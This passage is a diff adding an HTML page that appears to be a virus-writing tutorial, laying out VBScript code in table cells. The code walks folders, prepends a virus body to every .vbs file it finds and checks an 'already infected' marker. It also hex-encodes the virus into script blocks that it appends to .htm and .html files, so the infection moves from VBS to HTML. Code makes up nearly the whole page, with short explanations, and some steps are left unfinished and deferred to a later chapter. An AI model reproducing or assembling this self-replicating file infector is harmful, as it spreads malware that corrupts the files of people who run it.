+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>On Error Resume Next</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Set fold = fso.GetFolder(doss)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Set yebjp = fold.SubFolders</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>For Each f1 In yebjp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' Get the folder</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>infect(f1.Path)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>list(f1.Path)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Next</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End Sub</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Sub infect(doss)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>On Error Resume Next</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Set zqhanx = CreateObject(&quot;Scripting.FileSystemObject&quot;)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Set lxxj = zqhanx.GetFolder(doss)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Set fc = lxxj.Files</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>For Each f1 In fc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' Get the files</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>ext = fso.GetExtensionName(f1.Path)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>ext = lCase(ext)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>If (ext = &quot;vbs&quot;) Then</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;Set cot = fso.OpenTextFile(f1.Path, 1, False)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;If cot.ReadLine &lt;&gt; &quot;'mark&quot; Then&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' check is already infected</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;cot.Close</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;Set cot = fso.OpenTextFile(f1.Path, 1, False)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;vbsorg = cot.ReadAll()</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;cot.Close</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;Set inf = fso.OpenTextFile(f1.Path, 2, True)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;inf.WriteLine virus&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' write virus code</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;inf.WriteLine &quot;&quot;</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;inf.WriteLine (vbsorg)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' write real code</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;inf.Close</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;End If</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End If</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Next</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End Sub</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>###################</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B># II: VBS -&gt; HTML #</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>###################</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>So, the idea is to put the viral code into the VBS file. How ?? by converting into hex string :</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>....</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>....</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>If (ext = &quot;htm&quot;) or (ext = &quot;html&quot;) Then</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;Set cot = fso.OpenTextFile(f1.Path, 1, False)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;If InStr(1,cot.ReadAll(),&quot;vbshex&quot;) = 0 Then&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' check is already infected</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;cot.Close</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;Set htmf = fso.OpenTextFile(f1.Path, 8, False)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;htmf.WriteLine &quot;&lt;SCRIPT LANGUAGE=VBSCRIPT&gt;&quot;</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;f = &quot;vbshex=&quot;&quot;&quot;</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;For i = 1 to Len(virus)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' take all char</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;e=Mid(virus,i,1)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;e=Hex(Asc(e))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' and convert in hex</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;If Len(e)=1 Then</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;e=&quot;0&quot;&amp;e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'DA -&gt; 0D0A for VbCrLf</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;End If</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;f=f+e</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;Next</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;f=f+&quot;&quot;&quot;&quot;</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;......&nbsp;&nbsp;&nbsp;&nbsp;NO FINISH, SEE THE fourth chapter&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' Here the infection HTML -&gt; VBS</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;htmf.WriteLine f</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;htmf.Close</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;End If</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>End If</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Set htmf = fso.CreateTextFile(&quot;hello.htm&quot;,8,-2)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>htmf.WriteLine &quot;&lt;SCRIPT LANGUAGE=VBSCRIPT&gt;&quot;</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>f = &quot;vbshex=&quot;&quot;&quot;</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>For i = 1 to Len(virus)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>e=Mid(virus,i,1)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>e=Hex(Asc(e))</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>If Len(e)=1 Then</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
